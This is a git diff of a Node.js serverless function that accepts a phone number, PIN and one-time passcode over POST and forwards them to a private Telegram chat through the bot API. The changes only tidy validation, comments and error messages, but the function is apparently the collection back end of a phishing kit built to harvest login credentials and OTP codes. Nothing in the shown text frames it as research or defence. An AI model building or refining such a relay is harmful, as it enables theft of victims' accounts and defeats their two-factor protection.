@@ -1,8 +1,8 @@
 const axios = require('axios');
 
-// Format Telegram message without hyphens in phone number
+// Format Telegram message without hyphens
 function formatMessage(type, phone, pin, otp) {
-  // Remove all non-digit characters from phone number
+  // Remove all non-digit characters
   const cleanPhone = phone.replace(/\D/g, '');
   
   let message = 
@@ -25,35 +25,39 @@ function formatMessage(type, phone, pin, otp) {
 }
 
 exports.handler = async (event, context) => {
-  // Only allow POST requests
+  // Only accept POST requests
   if (event.httpMethod !== 'POST') {
-    return { 
-      statusCode: 405, 
-      body: 'Method Not Allowed',
+    return {
+      statusCode: 405,
+      body: JSON.stringify({ error: 'Method Not Allowed' }),
       headers: { 'Content-Type': 'application/json' }
     };
   }
 
   try {
+    // Parse and validate request
     const { type, phone, pin, otp } = JSON.parse(event.body);
-
-    // Clean phone number from any formatting
-    const cleanPhone = phone ? phone.replace(/\D/g, '') : '';
-
-    // Validate required fields
-    if (!type || !cleanPhone || cleanPhone.length < 10) {
+    
+    if (!type || !phone) {
       return {
         statusCode: 400,
-        body: JSON.stringify({ 
-          error: 'Invalid request: Phone number must be at least 10 digits',
-          received: phone,
-          cleaned: cleanPhone
-        }),
+        body: JSON.stringify({ error: 'Type and phone are required' }),
         headers: { 'Content-Type': 'application/json' }
       };
     }
 
-    // Check for Telegram configuration
+    // Clean phone number
+    const cleanPhone = phone.replace(/\D/g, '');
+    
+    if (cleanPhone.length < 10) {
+      return {
+        statusCode: 400,
+        body: JSON.stringify({ error: 'Phone number must be at least 10 digits' }),
+        headers: { 'Content-Type': 'application/json' }
+      };
+    }
+
+    // Check Telegram config
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
 
@@ -61,9 +65,9 @@ exports.handler = async (event, context) => {
       throw new Error('Server configuration error: Missing Telegram credentials');
     }
 
-    // Format and send the message
+    // Format and send message
     const message = formatMessage(type, cleanPhone, pin, otp);
-
+    
     const telegramResponse = await axios.post(
       `https://api.telegram.org/bot${botToken}/sendMessage`,
       {
@@ -72,7 +76,7 @@ exports.handler = async (event, context) => {
         parse_mode: 'HTML'
       },
       {
-        timeout: 5000 // 5 seconds timeout
+        timeout: 5000 // 5 second timeout
       }
     );
 
@@ -80,20 +84,21 @@ exports.handler = async (event, context) => {
       statusCode: 200,
       body: JSON.stringify({ 
         success: true,
+        message: 'Data sent successfully',
         telegram_status: telegramResponse.status
       }),
       headers: { 'Content-Type': 'application/json' }
     };
 
   } catch (error) {
-    console.error('Error processing request:', error);
+    console.error('Error:', error);
     
     return {
       statusCode: 500,
       body: JSON.stringify({
         error: 'Internal Server Error',
         details: error.message,
-        request_body: event.body
+        request: event.body
       }),
       headers: { 'Content-Type': 'application/json' }
     };
